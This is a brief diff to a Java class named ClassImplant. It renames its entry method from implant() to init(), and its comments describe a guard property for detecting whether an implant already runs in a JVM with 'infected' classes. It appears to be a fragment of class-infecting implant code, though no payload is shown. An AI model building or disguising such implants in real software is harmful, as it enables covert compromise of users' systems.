@@ -1,7 +1,7 @@
 package org.example.implants;
 
 public class ClassImplant implements Runnable, Thread.UncaughtExceptionHandler {
-    public static void implant() {
+    public static void init() {
         // "java.class.init" is a made up property used to determine if an implant is already running in this JVM
         // (as could the case be if more than one class is infected)
         if (System.getProperty("java.class.init") == null) {
